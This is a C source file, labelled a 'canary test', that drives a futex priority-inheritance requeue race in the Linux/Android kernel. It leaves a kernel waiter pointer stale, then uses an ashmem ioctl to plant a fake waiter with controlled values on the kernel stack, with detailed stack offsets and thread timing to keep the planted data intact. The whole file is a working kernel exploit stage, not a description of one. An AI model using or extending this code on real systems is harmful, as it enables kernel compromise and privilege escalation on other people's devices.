/*
 * gl_ashmem_probe.c - canary test with an ashmem stack buffer.
 *
 * Geometry (reproduced build, GCC 4.8, same config):
 *
 *   top = stack_base + 8192
 *   vector_swi                      sp = top - 72
 *   SyS_ioctl      (9 regs + 8)     sp = top - 116
 *   do_vfs_ioctl   (10 regs + 60)   sp = top - 216
 *   ashmem_ioctl   (10 regs + 36)   sp = top - 292
 *   set_name       (7 regs + 268)   sp = top - 588
 *   local_name[256] = fp - 288      = top - 584 .. top - 328
 *
 *   futex rt_waiter (measured in the previous oops) = top - 532
 *   => fake waiter starts at local_name + 52, lock at +96.
 *
 * set_name() copies a 256-byte user string with strncpy_from_user(). Filling it
 * with 0xdeadbeef (no NUL bytes) makes waiter->lock = 0xdeadbeef; the kernel
 * then faults in rt_mutex_adjust_prio_chain walking the stale pointer.
 *
 * A's first syscall after the futex timeout is ioctl(ASHMEM_SET_NAME); it then
 * returns to userspace and busy-spins WITHOUT making any syscall. B waits for
 * the spin flag and immediately does FUTEX_LOCK_PI(Lx). No schedule() runs on
 * A's kernel stack in the window, so the fake waiter is not overwritten (the
 * earlier pause() attempt was: its schedule frame is deeper than top-532).
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef FUTEX_PRIVATE_FLAG
#define FUTEX_PRIVATE_FLAG 128
#endif

/* _IOW(0x77, 1, char[256]) from drivers/staging/android/uapi/ashmem.h */
#define ASHMEM_SET_NAME 0x41007701u
#define ASHMEM_NAME_LEN 256

#define CANARY 0xdeadbeefu

static int futex6(uint32_t *uaddr, int op, uint32_t val,
                  const struct timespec *to, uint32_t *uaddr2, uint32_t val3)
{
    return (int)syscall(__NR_futex, uaddr, op, val, to, uaddr2, val3);
}

static uint32_t rd32(const uint32_t *p)
{
    return *(volatile const uint32_t *)p;
}

static double now_s(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1e9;
}

static void msleep(int ms)
{
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (long)(ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

static void pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

static void read_wchan(pid_t tid, char *buf, size_t len)
{
    char path[64];
    int fd;
    ssize_t n;

    buf[0] = 0;
    snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", (int)tid);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return;
    n = read(fd, buf, len - 1);
    if (n > 0)
        buf[n] = 0;
    close(fd);
}

static void on_usr1(int sig)
{
    (void)sig;
}

struct round {
    uint32_t lx;
    uint32_t l2;
    uint32_t uaddr1;

    volatile int a_owns_lx;
    volatile int c_owns_l2;
    volatile int a_waiting;
    pid_t a_tid;
    pid_t c_tid;

    int c_lock_l2_ret, c_lock_l2_err;
    int c_lock_lx_ret, c_lock_lx_err;
    int a_ret, a_err;
    int b_ret, b_err;
    int b_lock_ret, b_lock_err;
    int am_ret, am_err;
    volatile int am_done;
    volatile int a_spinning;
    volatile int stop;
    char a_wchan[128];
    char c_wchan[128];
};

static struct round R;

static void *thread_c(void *arg)
{
    (void)arg;
    pin_cpu(1);
    R.c_tid = (pid_t)syscall(__NR_gettid);

    errno = 0;
    R.c_lock_l2_ret = futex6(&R.l2, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                             0, NULL, NULL, 0);
    R.c_lock_l2_err = errno;
    if (R.c_lock_l2_ret != 0)
        return NULL;
    printf("C: l2=%d/%d\n", R.c_lock_l2_ret, R.c_lock_l2_err);
    R.c_owns_l2 = 1;

    while (!R.a_owns_lx)
        msleep(1);

    errno = 0;
    R.c_lock_lx_ret = futex6(&R.lx, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                             0, NULL, NULL, 0);
    R.c_lock_lx_err = errno;
    printf("C: lx=%d/%d\n", R.c_lock_lx_ret, R.c_lock_lx_err);

    futex6(&R.lx, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    futex6(&R.l2, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    return NULL;
}

static void *thread_b(void *arg)
{
    (void)arg;
    double t0 = now_s();
    char wa[128] = "";
    char wc[128] = "";
    struct timespec deadline;
    int i;

    pin_cpu(2);

    while (!R.a_waiting && now_s() - t0 < 1.0)
        msleep(1);

    for (i = 0; i < 300; i++) {
        int c_queued;
        read_wchan(R.a_tid, wa, sizeof(wa));
        read_wchan(R.c_tid, wc, sizeof(wc));
        c_queued = strstr(wc, "futex") || strstr(wc, "rt_mutex") ||
                   (rd32(&R.lx) & FUTEX_WAITERS);
        if (strstr(wa, "futex") && c_queued)
            break;
        msleep(1);
    }

    errno = 0;
    R.b_ret = futex6(&R.uaddr1, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                     1, NULL, &R.l2, 0);
    R.b_err = errno;

    clock_gettime(CLOCK_MONOTONIC, &deadline);
    deadline.tv_sec += 3;

    /* Tight userspace handshake: no syscall between A's flag and our lock.
     * Any msleep/printf here gives the timer interrupt time to schedule on
     * A's stack and overwrite the fake waiter. */
    for (i = 0; i < 2000000000 && !R.a_spinning; i++) {
        if (R.am_err == ENOTTY) {
            R.stop = 1;
            return NULL;
        }
    }
    __sync_synchronize();

    if (!R.a_spinning) {
        R.stop = 1;
        return NULL;
    }

    errno = 0;
    R.b_lock_ret = futex6(&R.lx, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                          0, &deadline, NULL, 0);
    R.b_lock_err = errno;
    R.stop = 1;

    /* Diagnostics only after the window. */
    read_wchan(R.a_tid, wa, sizeof(wa));
    read_wchan(R.c_tid, wc, sizeof(wc));
    snprintf(R.a_wchan, sizeof(R.a_wchan), "%s", wa);
    snprintf(R.c_wchan, sizeof(R.c_wchan), "%s", wc);
    printf("B: lock=%d/%d am=%d/%d a_wchan='%s' c_wchan='%s'\n",
           R.b_lock_ret, R.b_lock_err, R.am_ret, R.am_err,
           R.a_wchan, R.c_wchan);
    return NULL;
}

static int one_round(void)
{
    pthread_t ta, tb, tc;
    struct timespec to;
    unsigned char name[ASHMEM_NAME_LEN];
    int amfd;
    int i;
    int ok;

    memset(&R, 0, sizeof(R));
    setvbuf(stdout, NULL, _IONBF, 0);
    for (i = 0; i < ASHMEM_NAME_LEN; i += 4) {
        uint32_t v = 0xf9011104u + ((uint32_t)(i / 4) * 0x100u);
        name[i + 0] = (unsigned char)(v & 0xff);
        name[i + 1] = (unsigned char)((v >> 8) & 0xff);
        name[i + 2] = (unsigned char)((v >> 16) & 0xff);
        name[i + 3] = (unsigned char)((v >> 24) & 0xff);
    }

    signal(SIGUSR1, on_usr1);

    amfd = open("/dev/ashmem", O_RDWR);
    if (amfd < 0) {
        printf("FAIL: open(/dev/ashmem) errno=%d (%s)\n", errno, strerror(errno));
        return 2;
    }
    printf("A: amfd=%d\n", amfd);
    pin_cpu(0);

    errno = 0;
    if (futex6(&R.lx, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
        printf("FAIL: A LOCK_PI(lx) errno=%d (%s)\n", errno, strerror(errno));
        return 2;
    }
    R.a_owns_lx = 1;
    R.a_tid = (pid_t)syscall(__NR_gettid);
    ta = pthread_self();

    if (pthread_create(&tc, NULL, thread_c, NULL) != 0)
        return 2;
    while (!R.c_owns_l2)
        msleep(1);

    if (pthread_create(&tb, NULL, thread_b, &ta) != 0)
        return 2;

    clock_gettime(CLOCK_MONOTONIC, &to);
    to.tv_nsec += 300 * 1000 * 1000L;
    if (to.tv_nsec >= 1000000000L) {
        to.tv_sec++;
        to.tv_nsec -= 1000000000L;
    }

    R.a_waiting = 1;
    errno = 0;
    R.a_ret = futex6(&R.uaddr1, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                     0, &to, &R.l2, 0);
    R.a_err = errno;

    /* FIRST syscall: copy the canary into set_name()'s local_name[]. */
    errno = 0;
    R.am_ret = (int)syscall(__NR_ioctl, amfd, ASHMEM_SET_NAME, name);
    R.am_err = errno;
    R.am_done = 1;

    /* No more syscalls: keep the ioctl's stack contents untouched while B
     * walks the stale pointer from another CPU. */
    R.a_spinning = 1;
    __sync_synchronize();
    {
        volatile unsigned long spin = 0;
        while (!R.stop && spin < 800000000UL)
            spin++;
    }
    printf("A: wait=%d/%d am=%d/%d spin_done stop=%d\n",
           R.a_ret, R.a_err, R.am_ret, R.am_err, R.stop);

    futex6(&R.lx, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);

    pthread_join(tb, NULL);
    pthread_join(tc, NULL);
    close(amfd);

    ok = (R.b_ret == -1 && R.b_err == EDEADLK) &&
         (R.b_lock_ret == -1 && (R.b_lock_err == EDEADLK ||
                                 R.b_lock_err == ETIMEDOUT));

    printf("round: requeue=%d/%d wait=%d/%d am=%d/%d "
           "b_lock=%d/%d a_wchan='%s' c_wchan='%s' %s\n",
           R.b_ret, R.b_err, R.a_ret, R.a_err, R.am_ret, R.am_err,
           R.b_lock_ret, R.b_lock_err,
           R.a_wchan, R.c_wchan, ok ? "NO_CRASH" : "MISMATCH");
    return ok ? 0 : 3;
}

int main(int argc, char **argv)
{
    int rounds = 1;
    int ok = 0, bad = 0, i;

    if (argc > 1)
        rounds = atoi(argv[1]);
    if (rounds < 1)
        rounds = 1;

    for (i = 0; i < rounds; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            int rc = one_round();
            fflush(stdout);
            _exit(rc);
        }
        if (pid < 0)
            return 2;
        int st = 0;
        waitpid(pid, &st, 0);
        if (WIFEXITED(st) && WEXITSTATUS(st) == 0)
            ok++;
        else
            bad++;
    }

    printf("RESULT ok=%d bad=%d rounds=%d\n", ok, bad, rounds);
    return bad == 0 ? 0 : 1;
}
